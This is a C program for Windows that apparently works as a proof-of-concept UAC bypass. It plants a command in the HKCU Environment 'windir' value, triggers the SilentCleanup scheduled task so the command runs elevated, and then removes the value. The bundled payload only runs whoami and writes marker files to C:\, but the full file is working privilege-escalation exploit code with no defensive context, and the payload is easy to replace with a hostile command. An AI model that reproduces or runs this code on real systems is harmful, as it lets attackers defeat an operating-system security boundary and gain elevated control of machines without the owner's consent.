#include <windows.h>
#include <stdio.h>

int main() {
    // Payload - runs elevated as high integrity / System context
    const char* payload = "cmd.exe /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA SILENTCLEANUP ON 25H2 > C:\\uac_bypassed.txt & timeout 5\"";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "windir", 0, REG_EXPAND_SZ, (const BYTE*)payload, (DWORD)strlen(payload) + 1);
        RegCloseKey(hKey);
    }

    // Trigger the task silently
    system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I");

    Sleep(10000);  // Wait longer for task to finish

    // Cleanup
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "windir");
        RegCloseKey(hKey);
    }

    printf("[+] SilentCleanup method triggered. Check C:\\ files now.\n");
    return 0;
}
